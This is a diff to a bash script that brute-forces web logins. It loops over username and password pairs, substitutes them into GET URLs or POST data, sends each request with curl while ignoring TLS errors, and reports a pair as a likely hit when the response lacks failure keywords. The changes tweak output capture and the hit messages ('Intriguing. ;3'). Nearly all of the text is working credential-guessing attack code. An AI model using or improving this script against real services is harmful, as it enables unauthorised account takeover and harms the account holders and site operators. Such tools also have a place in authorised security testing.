@@ -11,6 +11,9 @@ if [[ $( echo "$1" | grep "help" ) ]]; then
 	exit 0
 fi
 
+# altering the provided vals for headers and cookies to pass through cURL
+# also made an attempt to strip whitespace but there still seems to be whitespace present in cURL output
+# I opted to leave as is resultingly and I will look at again if the whitespace turns out to be problematic
 if [[ $( echo "$header" | grep "header " ) ]] ; then
 	IFS=";" ; headers=( `echo "${header//header/}" | sed -e 's/^[ \t]*//'` )
 	headers=( "${headers[@]/#/-H }" )
@@ -36,8 +39,8 @@ do
 		case "$method" in
 			"get"|"g"|"G"|"GET")
 				url=$( echo "${url}" | sed -e s/{user}/"$u"/g -e s/{pass}/"$p"/g ) 
-				if [[ $( curl -v --insecure "${cookies[@]//[ \t]/}" "${headers[@]}" "${url}" | grep -E -- "Invalid|invalid|incorrect|wrong|Incorrect|Wrong|Fail|fail|ERROR|error" ) ]] ; then echo "Nope." && continue
-				else echo "Hmm... Could have a hit here ($u:$p)" && exit 0
+				if [[ $( curl -v "${url}" -s --insecure "${cookies[@]}" "${headers[@]}" 2>&1 | grep -E -- "Invalid|invalid|incorrect|wrong|Incorrect|Wrong|Fail|fail|ERROR|error" ) ]] ; then echo "$u:$p = Nope." && continue
+				else echo "$u:$p = Intriguing. ;3" && exit 0
 				fi 
 				;;
 			"POST"|"P"|"p"|"post")
@@ -47,7 +50,7 @@ do
 				fi
 
 				data=$( echo "${data}" | sed -e s/{user}/"$u"/g -e s/{pass}/"$p"/g ) ; echo curl -v "${url}" -s --insecure "${cookies[@]}" "${headers[@]}" -d "${data}"
-				if [[ $( curl -v "${url}" -s --insecure "${cookies[@]}" "${headers[@]}" -d "${data}" |  grep -E -- "Invalid|invalid|incorrect|wrong|Incorrect|Wrong|Fail|fail|ERROR|error" ) ]] ; then 
+				if [[ $( curl -v "${url}" -s --insecure "${cookies[@]}" "${headers[@]}" -d "${data}" 2>&1 |  grep -E -- "Invalid|invalid|incorrect|wrong|Incorrect|Wrong|Fail|fail|ERROR|error" ) ]] ; then 
 					echo "$u:$p = Nope." && continue
 				else echo "$u:$p = Intriguing. ;3" && exit 0
 				fi
